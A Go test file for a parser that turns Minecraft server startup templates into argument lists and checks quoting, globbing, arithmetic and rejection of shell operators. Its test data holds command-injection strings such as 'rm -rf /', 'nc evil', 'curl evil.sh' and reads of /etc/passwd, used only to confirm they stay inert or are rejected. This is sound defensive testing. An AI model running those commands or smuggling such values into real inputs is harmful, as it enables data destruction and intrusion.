package startup

import (
	"errors"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"syscall"
	"testing"
	"time"
)

func env(kv ...string) func(string) (string, bool) {
	m := map[string]string{}
	for _, s := range kv {
		k, v, _ := strings.Cut(s, "=")
		m[k] = v
	}
	return func(k string) (string, bool) { v, ok := m[k]; return v, ok }
}

func workdir(t *testing.T, files ...string) string {
	t.Helper()
	dir := t.TempDir()
	for _, f := range files {
		path := filepath.Join(dir, f)
		if strings.HasSuffix(f, "/") {
			if err := os.MkdirAll(path, 0o755); err != nil {
				t.Fatal(err)
			}
			continue
		}
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte("x"), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

var stdEnv = env(
	"SERVER_MEMORY=4096", "SERVER_JARFILE=server.jar", "SERVER_PORT=25565",
	"EMPTY=", "JVM_FLAGS=-XX:+UseG1GC  -XX:MaxGCPauseMillis=200",
	"SPACED=my server.jar", "UNICODE=wörld-世界.jar",
	"INJECT=x; rm -rf / && $(id) `id` | nc evil 1 > /etc/passwd",
	"GLOBBY=*.jar", "QUOTES=\"a b\" 'c d'",
	"NEG=-512", "ZERO=0", "ARRAY=a[$(id)]", "EXPR=2+3", "OCTAL=010", "PADDED= 42",
)

func TestParseValid(t *testing.T) {
	tests := []struct {
		name     string
		template string
		files    []string
		want     []string
		assign   []Assignment
	}{
		{"pterodactyl paper egg", "java -Xms128M -XX:MaxRAMPercentage=95.0 -Dterminal.jline=false -Dterminal.ansi=true -jar {{SERVER_JARFILE}}", nil,
			[]string{"java", "-Xms128M", "-XX:MaxRAMPercentage=95.0", "-Dterminal.jline=false", "-Dterminal.ansi=true", "-jar", "server.jar"}, nil},
		{"memory inside word", "java -Xms128M -Xmx{{SERVER_MEMORY}}M -jar {{SERVER_JARFILE}}", nil,
			[]string{"java", "-Xms128M", "-Xmx4096M", "-jar", "server.jar"}, nil},
		{"dollar forms are equivalent", "java -Xmx${SERVER_MEMORY}M -Dport=$SERVER_PORT", nil,
			[]string{"java", "-Xmx4096M", "-Dport=25565"}, nil},
		{"extra whitespace and newlines", "  java \t -server\n\r\n  -jar   {{SERVER_JARFILE}}  ", nil,
			[]string{"java", "-server", "-jar", "server.jar"}, nil},
		{"line continuation", "java \\\n  -jar \\\r\n  x.jar", nil, []string{"java", "-jar", "x.jar"}, nil},
		{"unquoted variable is field-split like a shell", "java {{JVM_FLAGS}} -jar x.jar", nil,
			[]string{"java", "-XX:+UseG1GC", "-XX:MaxGCPauseMillis=200", "-jar", "x.jar"}, nil},
		{"quoted variable stays one argument", `java -jar "{{SPACED}}"`, nil, []string{"java", "-jar", "my server.jar"}, nil},
		{"unquoted spaced value splits (shell compatible)", "java -jar {{SPACED}}", nil, []string{"java", "-jar", "my", "server.jar"}, nil},
		{"empty unquoted variable disappears", "java {{EMPTY}} -jar x.jar", nil, []string{"java", "-jar", "x.jar"}, nil},
		{"empty quoted variable is an empty argument", `java "{{EMPTY}}" x`, nil, []string{"java", "", "x"}, nil},
		{"empty quotes", `java '' ""`, nil, []string{"java", "", ""}, nil},
		{"single quotes are literal", `java '-Dx=$HOME;|&' -jar x`, nil, []string{"java", "-Dx=$HOME;|&", "-jar", "x"}, nil},
		{"double quotes keep operators literal", `java "-Dmotd=a;b|c&d>e<f(g)" x`, nil, []string{"java", "-Dmotd=a;b|c&d>e<f(g)", "x"}, nil},
		{"backslash escapes", `java -Dx=a\ b \; \| \$HOME \{\{X\}\}`, nil, []string{"java", "-Dx=a b", ";", "|", "$HOME", "{{X}}"}, nil},
		{"double-quote escapes", `java "a\"b\\c\$d\` + "`" + `e\nf"`, nil, []string{"java", "a\"b\\c$d`e\\nf"}, nil},
		{"concatenated quoting", `java -D"a b"'c d'e`, nil, []string{"java", "-Da bc de"}, nil},
		{"unicode literal and value", `java -Dname=Grüße "{{UNICODE}}" ☃`, nil, []string{"java", "-Dname=Grüße", "wörld-世界.jar", "☃"}, nil},
		{"injection attempt stays data (quoted)", `java -jar "{{INJECT}}"`, nil,
			[]string{"java", "-jar", "x; rm -rf / && $(id) `id` | nc evil 1 > /etc/passwd"}, nil},
		{"injection attempt stays data (unquoted, only split)", `java -jar {{INJECT}}`, nil,
			[]string{"java", "-jar", "x;", "rm", "-rf", "/", "&&", "$(id)", "`id`", "|", "nc", "evil", "1", ">", "/etc/passwd"}, nil},
		{"quotes inside values are data", `java {{QUOTES}}`, nil, []string{"java", `"a`, `b"`, `'c`, `d'`}, nil},
		{"values are never globbed", `java -jar {{GLOBBY}}`, []string{"a.jar", "b.jar"}, []string{"java", "-jar", "*.jar"}, nil},
		{"lone dollar is literal", `java -Dprice=5 $ "$"`, nil, []string{"java", "-Dprice=5", "$", "$"}, nil},
		{"env assignment prefix", `MALLOC_ARENA_MAX=2 LANG="C.UTF-8 x" java -jar x.jar`, nil,
			[]string{"java", "-jar", "x.jar"}, []Assignment{{"MALLOC_ARENA_MAX", "2"}, {"LANG", "C.UTF-8 x"}}},
		{"assignment values are not split", `A={{JVM_FLAGS}} java`, nil, []string{"java"}, []Assignment{{"A", "-XX:+UseG1GC  -XX:MaxGCPauseMillis=200"}}},
		{"assignment-looking words after the command are arguments", `java A=1 -jar x`, nil, []string{"java", "A=1", "-jar", "x"}, nil},
		{"argfile", `java @user_jvm_args.txt @unix_args.txt`, nil, []string{"java", "@user_jvm_args.txt", "@unix_args.txt"}, nil},
		{"java classpath wildcard quoted", `java -cp "libs/*" Main`, []string{"libs/a.jar", "libs/b.jar"}, []string{"java", "-cp", "libs/*", "Main"}, nil},
		{"glob selects the single match", `java -jar forge-*.jar nogui`, []string{"forge-1.20.1-47.2.0.jar", "eula.txt"},
			[]string{"java", "-jar", "forge-1.20.1-47.2.0.jar", "nogui"}, nil},
		{"glob ignores dotfiles", `java -jar *.jar`, []string{".hidden.jar", "server.jar"}, []string{"java", "-jar", "server.jar"}, nil},
		{"glob with no match is literal", `java -jar FTBserver-*.jar`, nil, []string{"java", "-jar", "FTBserver-*.jar"}, nil},
		{"glob in subdirectory", `java -jar libraries/net/*/server.jar`, []string{"libraries/net/neoforge/server.jar"},
			[]string{"java", "-jar", "libraries/net/neoforge/server.jar"}, nil},
		{"question mark glob", `java -jar server?.jar`, []string{"server1.jar"}, []string{"java", "-jar", "server1.jar"}, nil},
		{"escaped glob is literal", `java -jar server\*.jar`, []string{"server1.jar"}, []string{"java", "-jar", "server*.jar"}, nil},
		{"quoted glob is literal", `java -jar "server*.jar"`, []string{"server1.jar"}, []string{"java", "-jar", "server*.jar"}, nil},
		{"unclosed bracket is literal", `java -Dx=[a`, nil, []string{"java", "-Dx=[a"}, nil},
		{"absolute path command", `/usr/bin/java -version`, nil, []string{"/usr/bin/java", "-version"}, nil},
		{"arithmetic panel memory idiom", "java -Xms$(({{SERVER_MEMORY}}*80/100))M -Xmx$(({{SERVER_MEMORY}}*80/100))M -jar {{SERVER_JARFILE}}", nil,
			[]string{"java", "-Xms3276M", "-Xmx3276M", "-jar", "server.jar"}, nil},
		{"arithmetic variable forms", "java $(( $SERVER_MEMORY - ${SERVER_PORT} % 1000 + SERVER_MEMORY / 2 + NEG ))", nil,
			[]string{"java", "5067"}, nil},
		{"arithmetic precedence and sign", "java $((2+3*4)) $(((2+3)*4)) $((-7/2)) $((-7%3)) $((- -3)) $((+5)) $((2*-3)) $((0))", nil,
			[]string{"java", "14", "20", "-3", "-1", "3", "5", "-6", "0"}, nil},
		{"arithmetic whitespace and newlines", "java $((\n  SERVER_MEMORY\t*\r\n2 ))", nil, []string{"java", "8192"}, nil},
		{"arithmetic in double quotes", `java "-Dheap=$((SERVER_MEMORY/2)) MB"`, nil, []string{"java", "-Dheap=2048 MB"}, nil},
		{"arithmetic in assignment", `HEAP=$((SERVER_MEMORY/2))M java`, nil, []string{"java"}, []Assignment{{"HEAP", "2048M"}}},
		{"arithmetic negative result", "java -Dx=$((NEG-1))", nil, []string{"java", "-Dx=-513"}, nil},
		{"arithmetic int64 bounds", "java $((-9223372036854775807-1)) $((9223372036854775807))", nil,
			[]string{"java", "-9223372036854775808", "9223372036854775807"}, nil},
		{"arithmetic result is never globbed", "java $((1))*", []string{"1a"}, []string{"java", "1a"}, nil},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dir := workdir(t, tt.files...)
			cmd, err := Parse(tt.template, Options{Lookup: stdEnv, Dir: dir})
			if err != nil {
				t.Fatalf("Parse(%q) error: %v", tt.template, err)
			}
			if !reflect.DeepEqual(cmd.Argv, tt.want) {
				t.Errorf("argv\n got %q\nwant %q", cmd.Argv, tt.want)
			}
			if !reflect.DeepEqual(cmd.Assignments, tt.assign) {
				t.Errorf("assignments\n got %q\nwant %q", cmd.Assignments, tt.assign)
			}
		})
	}
}

func TestStrictMode(t *testing.T) {
	opts := Options{Lookup: stdEnv, Strict: true, ArgListVars: map[string]bool{"JVM_FLAGS": true}}
	cmd, err := Parse(`java {{JVM_FLAGS}} -jar {{SPACED}} {{EMPTY}}`, opts)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"java", "-XX:+UseG1GC", "-XX:MaxGCPauseMillis=200", "-jar", "my server.jar"}
	if !reflect.DeepEqual(cmd.Argv, want) {
		t.Errorf("got %q want %q", cmd.Argv, want)
	}
}

const forgeIdiom = `java -Xms128M -XX:MaxRAMPercentage=95.0 -Dterminal.jline=false -Dterminal.ansi=true $( [[  ! -f unix_args.txt ]] && printf %s "-jar {{SERVER_JARFILE}}" || printf %s "@unix_args.txt" )`

func TestCompatibilityIdioms(t *testing.T) {
	base := []string{"java", "-Xms128M", "-XX:MaxRAMPercentage=95.0", "-Dterminal.jline=false", "-Dterminal.ansi=true"}
	tests := []struct {
		name     string
		template string
		files    map[string]string
		want     []string
	}{
		{"forge egg, modern installer", forgeIdiom, map[string]string{"unix_args.txt": "-p x"}, append(base, "@unix_args.txt")},
		{"forge egg, legacy jar", forgeIdiom, nil, append(base, "-jar", "server.jar")},
		{"optional user args present", `java $([[ -f user_jvm_args.txt ]] && printf %s "@user_jvm_args.txt") -jar x`,
			map[string]string{"user_jvm_args.txt": ""}, []string{"java", "@user_jvm_args.txt", "-jar", "x"}},
		{"optional user args absent", `java $([[ -f user_jvm_args.txt ]] && printf %s "@user_jvm_args.txt") -jar x`, nil, []string{"java", "-jar", "x"}},
		{"single bracket test", `java $( [ -e a ] && printf '%s' 'yes' || printf "%s" no )`, nil, []string{"java", "no"}},
		{"backtick cat inside printf", "java $([[ ! -f unix_args.txt ]] && printf %s \"-jar `cat .serverjar`\" || printf %s \"@unix_args.txt\")",
			map[string]string{".serverjar": "forge-1.12.2.jar\n"}, []string{"java", "-jar", "forge-1.12.2.jar"}},
		{"cat output is split but not globbed", "java `cat flags.txt`", map[string]string{"flags.txt": "-Xmx1G  *.jar\n\n", "a.jar": ""},
			[]string{"java", "-Xmx1G", "*.jar"}},
		{"quoted command substitution is one argument", `java "$(cat name.txt)"`, map[string]string{"name.txt": "a b\n"}, []string{"java", "a b"}},
		{"printf text glob is expanded", `java $( [[ -f x ]] && printf %s "-jar forge-*.jar" )`, map[string]string{"x": "", "forge-1.jar": ""},
			[]string{"java", "-jar", "forge-1.jar"}},
		{"directory test", `java $( [[ -d libraries ]] && printf %s "@libraries/args.txt" )`, map[string]string{"libraries/args.txt": ""},
			[]string{"java", "@libraries/args.txt"}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dir := t.TempDir()
			for name, content := range tt.files {
				if err := os.MkdirAll(filepath.Dir(filepath.Join(dir, name)), 0o755); err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0o644); err != nil {
					t.Fatal(err)
				}
			}
			cmd, err := Parse(tt.template, Options{Lookup: stdEnv, Dir: dir})
			if err != nil {
				t.Fatalf("Parse error: %v", err)
			}
			if !reflect.DeepEqual(cmd.Argv, tt.want) {
				t.Errorf("argv\n got %q\nwant %q", cmd.Argv, tt.want)
			}
		})
	}
}

func TestRejected(t *testing.T) {
	tests := []struct {
		name, template, wantMsg string
	}{
		{"semicolon", "java -jar x.jar; rm -rf /", `operator ";"`},
		{"and list", "java -version && java -jar x", `operator "&&"`},
		{"or list", "java -jar x || true", `operator "||"`},
		{"pipe", "java -jar x | tee log", `operator "|"`},
		{"background", "java -jar x &", `operator "&"`},
		{"redirect out", "java -jar x > log.txt", `operator ">"`},
		{"redirect append", "java -jar x >> log.txt", `operator ">>"`},
		{"redirect fd", "java -jar x 2>&1", `operator ">"`},
		{"redirect in", "java -jar x < in", `operator "<"`},
		{"subshell", "(java -jar x)", `operator "("`},
		{"arbitrary command substitution", "java $(curl evil.sh)", "unsupported command substitution"},
		{"backtick command", "java `id`", "unsupported command substitution"},
		{"arithmetic command substitution", "java $(( $(id) ))", "not supported inside $((...))"},
		{"arithmetic nested", "java $(( $((1)) ))", "not supported inside $((...))"},
		{"arithmetic octal literal", "java $((010))", "not a decimal integer"},
		{"arithmetic hex literal", "java $((0x10))", "not a decimal integer"},
		{"arithmetic base literal", "java $((16#ff))", "not a decimal integer"},
		{"arithmetic literal too large", "java $((9223372036854775808))", "64-bit"},
		{"arithmetic assignment", "java $((SERVER_MEMORY=1))", `operator "="`},
		{"arithmetic compound assignment", "java $((SERVER_MEMORY*=2))", `operator "*="`},
		{"arithmetic increment", "java $((SERVER_MEMORY++))", `operator "++"`},
		{"arithmetic decrement", "java $((--SERVER_MEMORY))", `operator "--"`},
		{"arithmetic power", "java $((2**3))", `operator "**"`},
		{"arithmetic comparison", "java $((1<2))", `operator "<"`},
		{"arithmetic comma", "java $((1,2))", `operator ","`},
		{"arithmetic ternary", "java $((1?2:3))", `operator "?"`},
		{"arithmetic array subscript", "java $((SERVER_MEMORY[1]))", `unexpected '['`},
		{"arithmetic quotes", `java $(("1"))`, `unexpected '"'`},
		{"arithmetic missing operand", "java $((1+))", "expected a number"},
		{"arithmetic missing operator", "java $((1 2))", "expected an operator"},
		{"arithmetic unbalanced", "java $((1+(2))", "expected an operator or '))'"},
		{"arithmetic split close", "java $((1+2) )", "expected an operator or '))'"},
		{"arithmetic unterminated", "java $((1+2", "unterminated $(("},
		{"arithmetic nested too deeply", "java $((" + strings.Repeat("(", 40) + "1" + strings.Repeat(")", 40) + "))", "nested too deeply"},
		{"arithmetic unary nested too deeply", "java $((" + strings.Repeat("- ", 40) + "1))", "nested too deeply"},
		{"parameter default", "java ${SERVER_MEMORY:-1024}", "unsupported parameter expansion"},
		{"positional parameter", "java $1", "unsupported expansion $1"},
		{"special parameter", "java $@", "unsupported expansion $@"},
		{"brace expansion", "java {a,b}.jar", "brace expansion"},
		{"stray close brace", "java a}", "unexpected '}'"},
		{"tilde", "java -jar ~/server.jar", "tilde"},
		{"comment", "java -jar x # comment", "comments"},
		{"unterminated single", "java 'abc", "unterminated single quote"},
		{"unterminated double", `java "abc`, "unterminated double quote"},
		{"unterminated subst", "java $( [[ -f x ]]", "unterminated $("},
		{"unterminated backtick", "java `cat x", "unterminated backtick"},
		{"unterminated var", "java {{SERVER_JARFILE", "unterminated {{"},
		{"invalid var name", "java {{SERVER JARFILE}}", "invalid variable reference"},
		{"empty var name", "java {{}}", "invalid variable reference"},
		{"dotted var name", "java {{server.build.memory}}", "invalid variable reference"},
		{"var in single quotes", "java '{{SERVER_JARFILE}}'", "inside single quotes"},
		{"trailing backslash", `java \`, "trailing backslash"},
		{"control char", "java \x07", "control character"},
		{"control char quoted", "java \"\x1b[31m\"", "control character"},
		{"nested test commands", "java $( [[ -f x ]] && rm x )", "unsupported command substitution"},
		{"test without printf", "java $( [[ -f x ]] )", "unsupported command substitution"},
		{"unsupported test op", "java $( [[ -x x ]] && printf %s y )", "unsupported command substitution"},
		{"printf with format", `java $( [[ -f x ]] && printf "%s %s" a b )`, "unsupported command substitution"},
		{"cat outside workdir", "java `cat ../../etc/passwd`", "only relative paths"},
		{"cat absolute", "java `cat /etc/passwd`", "only relative paths"},
		{"nested too deeply", "java $(cat $(cat $(cat x)))", "nested too deeply"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := Parse(tt.template, Options{Lookup: stdEnv, Dir: t.TempDir()})
			if err == nil {
				t.Fatalf("Parse(%q) succeeded, want error containing %q", tt.template, tt.wantMsg)
			}
			if !strings.Contains(err.Error(), tt.wantMsg) {
				t.Errorf("error %q does not contain %q", err, tt.wantMsg)
			}
		})
	}
}

func TestCatStaysInsideTheWorkingDirectory(t *testing.T) {
	outside := t.TempDir()
	if err := os.WriteFile(filepath.Join(outside, "secret"), []byte("leaked"), 0o644); err != nil {
		t.Fatal(err)
	}
	dir := workdir(t, "real.txt")
	if err := os.Symlink(filepath.Join(outside, "secret"), filepath.Join(dir, "escape")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("real.txt", filepath.Join(dir, "inside")); err != nil {
		t.Fatal(err)
	}
	if err := syscall.Mkfifo(filepath.Join(dir, "pipe"), 0o644); err != nil {
		t.Fatal(err)
	}
	for _, tt := range []struct{ file, wantMsg string }{
		{"escape", "escapes"},
		{"pipe", "not a regular file"},
	} {
		t.Run(tt.file, func(t *testing.T) {
			done := make(chan error, 1)
			go func() {
				_, err := Parse("java `cat "+tt.file+"`", Options{Lookup: stdEnv, Dir: dir})
				done <- err
			}()
			select {
			case err := <-done:
				var ee *ExpansionError
				if !errors.As(err, &ee) || !strings.Contains(err.Error(), tt.wantMsg) {
					t.Fatalf("want ExpansionError containing %q, got %T %v", tt.wantMsg, err, err)
				}
			case <-time.After(5 * time.Second):
				t.Fatal("cat blocked")
			}
		})
	}
	if _, err := Parse("java `cat inside`", Options{Lookup: stdEnv, Dir: dir}); err != nil {
		t.Errorf("symlink inside the working directory: %v", err)
	}
}

func TestExpansionErrors(t *testing.T) {
	dir := workdir(t, "forge-1.jar", "forge-1-installer.jar")
	tests := []struct {
		name, template, wantMsg string
		opts                    Options
	}{
		{"missing variable", "java -jar {{NOPE}}", "variable NOPE is not set", Options{}},
		{"missing dollar variable", "java -jar $NOPE", "variable NOPE is not set", Options{}},
		{"ambiguous glob", "java -jar forge-*.jar", "ambiguous", Options{}},
		{"empty template", "   ", "no command", Options{}},
		{"only assignments", "A=1 B=2", "no command", Options{}},
		{"only empty variable", "{{EMPTY}}", "no command", Options{}},
		{"cat missing file", "java `cat nope.txt`", "cat \"nope.txt\"", Options{}},
		{"whitespace var unquoted in idiom", "java $( [[ -f {{SPACED}} ]] && printf %s x )", "contains whitespace", Options{}},
		{"arithmetic injection via subscript", "java $((ARRAY*2))", `variable ARRAY is "a[$(id)]"`, Options{}},
		{"arithmetic injection via braces", "java $(({{ARRAY}}))", "needs a decimal integer", Options{}},
		{"arithmetic value is not re-evaluated", "java $(($EXPR*2))", `variable EXPR is "2+3"`, Options{}},
		{"arithmetic value with spaces", "java $((${PADDED}))", "needs a decimal integer", Options{}},
		{"arithmetic octal value", "java $((OCTAL))", "no leading zeros", Options{}},
		{"arithmetic other text value", "java $((SERVER_JARFILE))", "needs a decimal integer", Options{}},
		{"arithmetic empty value", "java $((EMPTY+1))", "needs a decimal integer", Options{}},
		{"arithmetic unset", "java $((NOPE+1))", "variable NOPE is not set", Options{}},
		{"arithmetic unset allowed is still not a number", "java $((NOPE+1))", "needs a decimal integer", Options{AllowUnset: true}},
		{"arithmetic division by zero", "java $((1/ZERO))", "division by zero", Options{}},
		{"arithmetic modulo by zero", "java $((1%(SERVER_MEMORY-4096)))", "division by zero", Options{}},
		{"arithmetic overflow add", "java $((9223372036854775807+1))", "64-bit", Options{}},
		{"arithmetic overflow mul", "java $((SERVER_MEMORY*9223372036854775807))", "64-bit", Options{}},
		{"arithmetic overflow negate", "java $((-(-9223372036854775807-1)))", "64-bit", Options{}},
		{"arithmetic overflow divide", "java $(((-9223372036854775807-1)/-1))", "64-bit", Options{}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			tt.opts.Lookup = stdEnv
			tt.opts.Dir = dir
			_, err := Parse(tt.template, tt.opts)
			var ee *ExpansionError
			if !errors.As(err, &ee) {
				t.Fatalf("want *ExpansionError, got %T %v", err, err)
			}
			if !strings.Contains(err.Error(), tt.wantMsg) {
				t.Errorf("error %q does not contain %q", err, tt.wantMsg)
			}
		})
	}
}

func TestAllowUnset(t *testing.T) {
	cmd, err := Parse("java {{NOPE}} -jar x", Options{Lookup: stdEnv, AllowUnset: true})
	if err != nil {
		t.Fatal(err)
	}
	if want := []string{"java", "-jar", "x"}; !reflect.DeepEqual(cmd.Argv, want) {
		t.Errorf("got %q want %q", cmd.Argv, want)
	}
}

func TestGlobNoMatchWarns(t *testing.T) {
	cmd, err := Parse("java -jar forge-*.jar", Options{Lookup: stdEnv, Dir: t.TempDir()})
	if err != nil {
		t.Fatal(err)
	}
	if len(cmd.Warnings) != 1 || !strings.Contains(cmd.Warnings[0], "matched no files") {
		t.Errorf("warnings = %q", cmd.Warnings)
	}
}

func TestLimits(t *testing.T) {
	if _, err := Parse(strings.Repeat("a", MaxTemplateBytes+1), Options{Lookup: stdEnv}); err == nil {
		t.Error("oversized template accepted")
	}
	if _, err := Parse("java \xff", Options{Lookup: stdEnv}); err == nil || !strings.Contains(err.Error(), "UTF-8") {
		t.Errorf("invalid UTF-8 accepted: %v", err)
	}
	big := env("BIG=" + strings.Repeat("x", MaxArgBytes+1))
	if _, err := Parse(`java "{{BIG}}"`, Options{Lookup: big}); err == nil {
		t.Error("oversized argument accepted")
	}
	many := env("MANY=" + strings.Repeat("a ", MaxArgs+1))
	if _, err := Parse(`java {{MANY}}`, Options{Lookup: many}); err == nil {
		t.Error("too many arguments accepted")
	}
	long := strings.Repeat("-Dk=v ", 4000)
	cmd, err := Parse("java "+long, Options{Lookup: stdEnv})
	if err != nil {
		t.Fatalf("long template: %v", err)
	}
	if len(cmd.Argv) != 4001 {
		t.Errorf("long template: %d args", len(cmd.Argv))
	}
}

func TestSyntaxErrorOffset(t *testing.T) {
	_, err := Parse("java -jar x; y", Options{Lookup: stdEnv})
	var se *SyntaxError
	if !errors.As(err, &se) || se.Offset != 11 {
		t.Fatalf("want SyntaxError at 11, got %#v", err)
	}
}

func TestRequiresLookup(t *testing.T) {
	if _, err := Parse("java", Options{}); err == nil {
		t.Error("missing Lookup accepted")
	}
}

// FuzzParse checks that no input crashes the parser and that every produced
// argument is free of NUL bytes and within limits.
func FuzzParse(f *testing.F) {
	for _, s := range []string{forgeIdiom, "java -jar {{SERVER_JARFILE}}", `a "b\"c" 'd' $X ${Y} {{Z}} $(cat f) \` + "`cat f`", "A=1 java *", "java -Xmx$(({{SERVER_MEMORY}}*80/100))M $((-(NEG+1)%7))"} {
		f.Add(s)
	}
	dir := f.TempDir()
	_ = os.WriteFile(filepath.Join(dir, "f"), []byte("x y"), 0o644)
	f.Fuzz(func(t *testing.T, s string) {
		cmd, err := Parse(s, Options{Lookup: stdEnv, Dir: dir, AllowUnset: true})
		if err != nil {
			return
		}
		if len(cmd.Argv) == 0 || len(cmd.Argv) > MaxArgs {
			t.Fatalf("argv length %d", len(cmd.Argv))
		}
		for _, a := range cmd.Argv {
			if strings.IndexByte(a, 0) >= 0 || len(a) > MaxArgBytes {
				t.Fatalf("bad argument %q", a)
			}
		}
	})
}
